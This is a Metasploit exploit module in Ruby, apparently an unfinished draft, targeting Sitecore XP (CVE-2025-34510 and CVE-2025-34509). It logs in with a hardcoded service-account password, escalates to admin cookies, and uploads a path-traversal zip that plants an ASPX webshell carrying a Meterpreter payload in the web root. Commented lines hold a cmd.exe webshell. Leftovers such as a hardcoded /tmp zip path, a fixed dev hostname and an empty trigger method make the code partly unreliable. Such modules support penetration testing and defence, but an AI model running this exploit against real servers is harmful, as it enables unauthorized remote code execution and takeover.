##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sitecore XP CVE-2025-34510 Post-Authentication Remote Code Execution',
        'Description' => %q{
          This module exploits CVE-2025-34510, path traversal leading to remote code execution. The module exploits also CVE-2025-34509 - hardcoded credentials of ServicesAPI account - to gain foothold. 
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Piotr Bazydlo', # Discovery
          'msutovsky-r7'    # Module Creator
        ],
        'References' => [
          ['CVE', '2025-34510'],
          ['URL', 'https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform'],
          ['URL', 'https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003667']
        ],
        'DisclosureDate' => '2025-06-17',
        'DefaultTarget' => 0,
        'Platform' => 'win',
        #'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
         # [
#            'Windows Command',
#            {
#              'Arch' => ARCH_CMD,
#              'Type' => :windows_command
#              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
#            }
#          ],
          [
            'Windows',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              # tested with windows/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true,
          # TODO: remove
          'DisablePayloadHandler' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the vulnerable endpoint', '/']),
      OptString.new('IDENTITY_VHOST', [false, 'Hostname of Sitecore identity server'])
    ])
  end

  def login
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Account', 'Login'),
      'method' => 'GET',
      'vhost' => datastore['IDENTITY_VHOST'],
      'keep_cookies' => 'true'
    })

    fail_with(Failure::Unknown, 'Received unknown response, check vhost of identity server') unless res&.code == 200

    hidden_inputs = res.get_hidden_inputs

    verification_token = hidden_inputs.dig(0, '__RequestVerificationToken')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'Account', 'Login'),
      'vhost' => datastore['IDENTITY_VHOST'],
      'vars_post' => {
        'Username' => 'ServicesAPI',
        'Password' => 'b',
        '__RequestVerificationToken' => verification_token,
        'ReturnUrl' => '',
        'AccountPrefix' => 'sitecore\\',
        'button' => 'login',
        'RememberLogin' => 'false'
      },
      'keep_cookies' => true
    })

    return false unless res&.code == 302 && !res.get_cookies.blank?

    @is_logged = true
    true
  end

  def get_elevated_cookies
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('identity', 'externallogin'),
      'vars_get' => {
        'authenticationType' => 'SitecoreIdentityServer',
        'ReturnUrl' => '',
        'sc_site' => 'admin'
      },
      'keep_cookies' => true
    })
    return false unless res&.code == 302

    location_target = res.headers.fetch('Location', nil)

    return false unless location_target

    location_target =~ %r{://([a-zA-Z0-9._]+)/}
    identity_vhost = Regexp.last_match(1)
    proto = datastore['ssl'] ? 'https' : 'http'
    identity_uri = location_target.sub("#{proto}://#{identity_vhost}", '')

    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => identity_uri,
      'vhost' => identity_vhost,
      'keep_cookies' => true
    })

    return false unless res&.code == 200

    hidden_inputs = res.get_hidden_inputs

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('identity', 'signin'),
      'vars_post' => hidden_inputs.dig(0),
      'keep_cookies' => true
    })

    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('identity', 'externallogincallback'),
      'vars_get' => {
        'ReturnUrl' => '',
        'sc_site' => 'admin',
        'authenticationSource' => 'Default'
      },
      'keep_cookies' => true
    })

    @is_elevated = true
    true
  end

  def check
    return Exploit::CheckCode::Unknown('Could not log in, application might not be Sitecore') unless login

    return Exploit::CheckCode::Safe('Could not get elevated cookies') unless get_elevated_cookies

    res = send_request_cgi({
      'uri' => normalize_uri('sitecore', 'shell', 'sitecore.version.xml'),
      'method' => 'GET'
    })
    return Exploit::CheckCode::Safe('Failed to get sitecore.version.xml') unless res&.code == 200 && res.body.include?('<version>')

    xml_document = res.get_xml_document

    major_version = xml_document.at('information//version//major').text
    minor_version = xml_document.at('information//version//minor').text
    build_version = xml_document.at('information//version//build').text

    sitecore_version = Rex::Version.new("#{major_version}.#{minor_version}.#{build_version}")

    return Exploit::CheckCode::Vulnerable("Sitecore version detected #{sitecore_version}, which is vulnerable") if sitecore_version <= Rex::Version.new('10.4') && sitecore_version >= Rex::Version.new('10.0.0')

    Exploit::CheckCode::Safe("Detected Sitecore version #{sitecore_version}, which is not vulnerable")
  end
  
  def upload_step(data)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('sitecore', 'shell', 'Applications', 'Dialogs', 'Upload', 'Upload2.aspx'),
      'vars_get' => { 'hdl' => 'sc_ct_trk' },
      'keep_cookies' => true,
      'vars_post' => data
    })
    res

  end

  def upload_zipslip

    fake_zip = "#{Rex::Text.rand_text_alphanumeric(10)}.zip"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('sitecore', 'shell', 'Applications', 'Dialogs', 'Upload', 'Upload2.aspx'),
      'vars_get' => { 'hdl' => 'sc_ct_trk' },
      'keep_cookies' => true
    })

    return false unless res&.code == 200

    hidden_inputs = res.get_hidden_inputs
    html_body = res.get_html_document

    view_state = html_body.at("input[@name='__VIEWSTATE']")

    file_el = html_body.xpath('//input').find { |link| link['name'] =~ /File([0-9]+)/ }

    return false unless hidden_inputs && view_state && file_el

    file_param = file_el['name']

    proto = datastore['ssl'] ? 'https' : 'http'
    
    res = upload_step({
        '__PARAMETERS' => 'FileChange',
        '__EVENTTARGET' => file_param,
        '__EVENTARGUMENT' => '',
        '__SOURCE' => file_param,
        '__EVENTTYPE' => 'change',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__SHIFTKEY' => '',
        '__CTRLKEY' => '',
        '__ALTKEY' => '',
        '__BUTTON' => 'undefined',
        '__KEYCODE' => 'undefined',
        '__X' => 'undefined',
        '__Y' => 'undefined',
        '__URL' => "#{proto}://#{datastore['vhost']}/sitecore/shell/Applications/Dialogs/Upload/Upload2.aspx%3Fhdl%3Dsc_ct_trk",
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        #'__VIEWSTATE' => hidden_inputs.dig(0, '__VIEWSTATE'),
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => '1',
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'ffSubmitForm' => ''
      })


    return false unless res&.code == 200

      res = upload_step({
        '__PARAMETERS' => '',
        '__EVENTTARGET' => 'NextButton',
        '__EVENTARGUMENT' => '',
        '__SOURCE' => 'NextButton',
        '__EVENTTYPE' => 'click',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__SHIFTKEY' => '',
        '__CTRLKEY' => '',
        '__ALTKEY' => '',
        '__BUTTON' => '0',
        '__KEYCODE' => 'undefined',
        '__X' => '1061',
        '__Y' => '1244',
        '__URL' => "#{proto}://#{datastore['vhost']}/sitecore/shell/Applications/Dialogs/Upload/Upload2.aspx%3Fhdl%3Dsc_ct_trk",
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => '1',
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'ffSubmitForm' => ''
      })
    
    return false unless res&.code == 200

      res = upload_step({
        '__PARAMETERS' => '',
        '__EVENTTARGET' => 'NextButton',
        '__EVENTARGUMENT' => '',
        '__SOURCE' => 'NextButton',
        '__EVENTTYPE' => 'click',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__SHIFTKEY' => '',
        '__CTRLKEY' => '',
        '__ALTKEY' => '',
        '__BUTTON' => '0',
        '__KEYCODE' => 'undefined',
        '__X' => '1089',
        '__Y' => '1269',
        '__URL' => "#{proto}://#{datastore['vhost']}/sitecore/shell/Applications/Dialogs/Upload/Upload2.aspx%3Fhdl%3Dsc_ct_trk",
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => '1',
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'ffSubmitForm' => ''
      })
    
    return false unless res&.code == 200
    
    res = upload_step({
        '__PARAMETERS' => 'upload:unzipclicked',
        '__EVENTTARGET' => 'UnzipCheck',
        '__EVENTARGUMENT' => '',
        '__SOURCE' => 'UnzipCheck',
        '__EVENTTYPE' => 'change',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__SHIFTKEY' => '',
        '__CTRLKEY' => '',
        '__ALTKEY' => '',
        '__BUTTON' => 'undefined',
        '__KEYCODE' => 'undefined',
        '__X' => 'undefined',
        '__Y' => 'undefined',
        '__URL' => "#{proto}://#{datastore['vhost']}/sitecore/shell/Applications/Dialogs/Upload/Upload2.aspx%3Fhdl%3Dsc_ct_trk",
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => '1',
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'UnzipCheck' => '1',
        'ffSubmitForm' => ''
      })
    
    return false unless res&.code == 200
    
      res = upload_step({
        '__PARAMETERS' => '',
        '__EVENTTARGET' => 'NextButton',
        '__EVENTARGUMENT' => '',
        '__SOURCE' => 'NextButton',
        '__EVENTTYPE' => 'click',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__SHIFTKEY' => '',
        '__CTRLKEY' => '',
        '__ALTKEY' => '',
        '__BUTTON' => '0',
        '__KEYCODE' => 'undefined',
        '__X' => '1105',
        '__Y' => '1271',
        '__URL' => "#{proto}://#{datastore['vhost']}/sitecore/shell/Applications/Dialogs/Upload/Upload2.aspx%3Fhdl%3Dsc_ct_trk",
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => '1',
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'UnzipCheck' => '1',
        'ffSubmitForm' => ''
      })
      
      return false unless res&.code == 200

      res = upload_step({
        '__PARAMETERS' => 'StartUploading',
        '__EVENTTARGET' => '',
        '__EVENTARGUMENT' => '',
        '__SOURCE' => '',
        '__EVENTTYPE' => '',
        '__CONTEXTMENU' => '__MODIFIED',
        '__ISEVENT' => '1',
        '__CSRFTOKEN' => hidden_inputs.dig(0, '__CSRFTOKEN'),
        '__VIEWSTATE' => view_state['value'],
        'Language' => hidden_inputs.dig(0, 'Language'),
        'Item' => hidden_inputs.dig(0, 'Item'),
        'Path' => hidden_inputs.dig(0, 'Path'),
        'Unzip' => hidden_inputs.dig(0, 'Path'),
        'Overwrite' => hidden_inputs.dig(0, 'Overwrite'),
        file_param => 'C%3A%5Cfakepath%5C'+fake_zip,
        'UnzipCheck' => '1',
        'ffSubmitForm' => ''
    })
    
    return false unless res&.code == 200
  

    zip = Rex::Zip::Archive.new()
   
    @webshell_file = "#{Rex::Text.rand_text_alpha(15)}.aspx"
    exe = generate_payload_exe
    asp = Msf::Util::EXE.to_exe_aspx(exe)
   #payload_webshell = %(<%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c calc.exe ";psi.RedirectStandardOutput = true;psi.UseShellExecute = false;psiProcess p = Process.Start(psi)</script>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)


    #zip.add_file('//\/../'+@webshell_file, %(<%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c calc.exe ";psi.RedirectStandardOutput = true;psi.UseShellExecute = false;psiProcess p = Process.Start(psi)</script>))
    #zip.add_file('//\/../'+@webshell_file, asp)
    zip.add_file('../../../../inetpub/wwwroot/sitecore_pocsc.dev.local/webshell.aspx', asp.to_s)
    zip_data = zip.pack
    zip_data = File.read("/tmp/slip/pica.zip")    
    puts store_local('superzip',nil, zip_data)

    data_post = Rex::MIME::Message.new
    data_post.add_part(hidden_inputs.dig(0, '__CSRFTOKEN'),nil, nil,%(form-data; name="__CSRFTOKEN"))
    data_post.add_part(view_state['value'], nil, nil, %(form-data; name="__VIEWSTATE"))
    data_post.add_part(hidden_inputs.dig(0, 'Item'), nil, nil, %(form-data; name="Item"))
    data_post.add_part(hidden_inputs.dig(0, 'Language'), nil, nil, %(form-data; name="Language"))
    data_post.add_part(hidden_inputs.dig(0, 'Path'), nil, nil, %(form-data; name="Path"))
    data_post.add_part('1', nil, nil, %(form-data; name="Unzip"))
    data_post.add_part(hidden_inputs.dig(0, 'Overwrite'), nil, nil, %(form-data; name="Overwrite"))
    data_post.add_part(zip_data, 'application/x-zip-compressed', nil, %(form-data; name="#{file_param}"; filename="#{fake_zip}"))

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('sitecore', 'shell', 'Applications', 'Dialogs', 'Upload', 'Upload2.aspx'),
      'vars_get' => { 'hdl' => 'sc_ct_trk' },
      'data' => data_post.to_s,
      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
    })

    return false unless res&.code == 200
    true
  end
  
  def trigger_payload
  end


  def exploit
    if !@is_logged && !login
      fail_with(Failure::NoAccess, 'Failed to log in, check the credentials')
    end

    if !@is_elevated && !get_elevated_cookies
      fail_with(Failure::Unknown, 'Failed to get elevated cookies')
    end

    fail_with(Failure::PayloadFailed, 'Failed to upload malicious ZIP') unless upload_zipslip
  end
end
